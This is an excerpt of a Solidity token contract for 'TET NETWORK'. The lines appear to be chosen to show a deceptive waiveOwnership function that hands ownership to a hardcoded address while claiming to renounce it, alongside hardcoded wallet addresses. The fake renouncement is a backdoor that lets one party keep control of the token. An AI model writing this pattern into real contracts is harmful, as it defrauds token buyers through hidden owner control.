...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x44cBdf2126Ea869a30a0390e77Bb9AbC15B83e6D);
    }
...
contract TETNETWORK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "TET NETWORK";
    string private _symbol = "TET";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6692289b4926Deb8551C6042e15230C2b2eee838);
    address payable public teamWalletAddress = payable(0x6D85859330F4bD206c52B1bcE125b8B4eACD7132);
